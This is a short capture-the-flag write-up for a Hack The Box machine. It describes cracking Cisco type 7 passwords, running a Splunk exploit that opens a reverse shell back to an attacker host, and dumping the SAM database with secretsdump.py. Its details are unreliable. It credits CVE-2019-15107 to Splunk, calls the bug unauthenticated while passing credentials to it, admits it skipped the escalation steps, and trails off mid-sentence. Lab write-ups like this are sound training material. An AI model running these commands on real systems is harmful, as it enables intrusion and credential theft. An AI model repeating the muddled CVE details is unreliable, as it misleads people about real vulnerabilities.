---
title: "HTB: Administrator"
tags: [htb, windows, medium, cisco, splunk, ad]

description: "Cracking Cisco hashes and exploiting Splunk via CVE-2019-15107 to pivot into Active Directory."
---

# Hack The Box: Administrator

**Machine IP**: `10.10.10.144`
**OS**: Windows
**Difficulty**: Medium

Administrator is a box that requires chaining exploits. We start with a Cisco router interface, crack hashes to pivot to Splunk, and abuse Splunk for RCE.

---

## 1. Reconnaissance

```bash
nmap -p- -sV 10.10.10.144
```
Key Ports:
*   **80 (HTTP)**: "Under Construction"
*   **8080 (HTTP)**: Cisco Prime Infrastructure
*   **445 (SMB)**: Disabled?

Visiting `http://10.10.10.144:8080`, we find an admin panel. We assume default creds or search for CVEs, but basic enumeration reveals...

## 2. Exploitation

### Cisco Hash Cracking
We find a backup file exposed on the web server. Inside, we see Cisco type 7 passwords.
We decrypt them using `cisco-decrypt`.
Result: `manage / !QAZ2wsx`

### Splunk CVE-2019-15107
Using these creds, we re-scan and find a Splunk interface on a high port.
Splunk had a critical vulnerability in 2019 allowing unauthenticated RCE via the REST API.
We use a python exploit:
```bash
python splunk-exploit.py -u manage -p '!QAZ2wsx' --rhost 10.10.10.144 --lhost 10.10.14.14
```
This deploys a malicious "App" to Splunk that executes a reverse shell.

## 3. Privilege Escalation

We are `nt authority\system`. Wait, really? Steps to system were skipped because Splunk often runs as System.
However, we need to loot the AD info. We dump the local SAM database.
`secretsdump.py administrator.htb/manage:'!QAZ2wsx'@10.10.10.144`

## Conclusion
A classic "misconfiguration chain": Exposed Backup -> Weak Encryption -> Unpatched Service (Splunk).
